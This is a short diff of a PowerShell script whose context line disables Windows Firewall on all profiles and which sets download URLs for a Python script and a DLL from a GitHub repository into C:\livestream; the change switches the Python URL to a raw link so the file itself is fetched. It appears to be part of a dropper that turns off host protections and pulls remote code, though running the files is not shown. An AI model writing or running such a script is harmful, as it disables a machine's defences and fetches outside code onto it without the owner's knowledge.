@@ -5,7 +5,7 @@ Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
 
 
 $folderPath = "C:\livestream"
-$pythonScriptUrl = "https://github.com/singsangsingsang1/host/blob/main/main.py"
+$pythonScriptUrl = "https://raw.githubusercontent.com/singsangsingsang1/host/main/main.py"
 $dllFileUrl = "https://github.com/singsangsingsang1/host/raw/main/LivestreamProcessor.dll"
 
 New-Item -Path $folderPath -ItemType Directory -Force
